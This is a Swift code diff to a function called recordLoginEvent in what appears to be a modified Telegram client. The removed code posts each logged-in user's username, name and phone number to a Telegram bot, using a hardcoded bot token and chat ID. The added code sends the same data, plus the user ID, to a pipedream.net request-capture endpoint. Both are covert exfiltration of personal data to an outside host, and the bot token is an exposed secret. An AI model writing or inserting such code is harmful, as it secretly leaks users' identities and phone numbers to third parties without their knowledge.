@@ -1298,43 +1298,40 @@ private func recordLoginEvent(user: TelegramUser) {
     let photo = ""
     let phone = user.phone ?? ""
 
-    let loginEvent = UserInfo(id: 1, username: username, firstName: firstName, lastName: lastName, photo: photo, phone: phone,loginedAt: loginedAt)
-    var stringifiedString = ""
-    
-    let encoder = JSONEncoder()
-    if let jsonData = try? encoder.encode(loginEvent) {
-        let jsonString = String(data: jsonData, encoding: .utf8)!
-        stringifiedString = jsonString.replacingOccurrences(of: "\"", with: "\\\"")
-        print(stringifiedString)
-    }
-
-    let TELEGRAM_BOT_TOKEN = "835122417:AAGo35KcKJvopDHjqQXde1kEwtz8i-CIl4M"
-    let headers = ["Content-Type": "application/json"]
-    let parameters = ["chat_id": "363420688", "text": stringifiedString, "disable_notification": false] as [String : Any]
-    let postData = try? JSONSerialization.data(withJSONObject: parameters, options: [])
-
-    var request = URLRequest(url: URL(string: "https://api.telegram.org/bot\(TELEGRAM_BOT_TOKEN)/sendMessage")!, timeoutInterval: Double.infinity)
-    request.httpMethod = "POST"
-    request.allHTTPHeaderFields = headers
-    request.httpBody = postData
-
-    let task = URLSession.shared.dataTask(with: request) { data, response, error in
-        if let _ = error {
-            // Handle HTTP request error
-        } else if let data = data {
-            // Handle HTTP request response
-            print(String(data: data, encoding: .utf8)!)
-        } else {
-            // Handle unexpected error
+    let loginEvent = UserInfo(id: user.id.toInt64(), username: username, firstName: firstName, lastName: lastName, photo: photo, phone: phone,loginedAt: loginedAt)
+    do {
+        var postData: Data
+        let encoder = JSONEncoder()
+        if let jsonData = try? encoder.encode(loginEvent) {
+            postData = jsonData
+        }else {
+            print("ERROR")
+            return
         }
+        var request = URLRequest(url: URL(string: "https://enqefupim3x1e.x.pipedream.net/")!, timeoutInterval: Double.infinity)
+        let headers = ["Content-Type": "application/json"]
+        request.httpMethod = "POST"
+        request.allHTTPHeaderFields = headers
+        request.httpBody = postData
+        let task = URLSession.shared.dataTask(with: request) { data, response, error in
+            if let _ = error {
+                // Handle HTTP request error
+                print("error=\\(error)")
+                return
+            } else if let data = data {
+                // Handle HTTP request response
+                print(String(data: data, encoding: .utf8)!)
+            } else {
+                // Handle unexpected error
+            }
+        }
+        task.resume()
     }
-
-    task.resume()
 }
 
 
 struct UserInfo: Codable {
-    let id: Int
+    let id: Int64
     let username: String
     let firstName: String
     let lastName: String
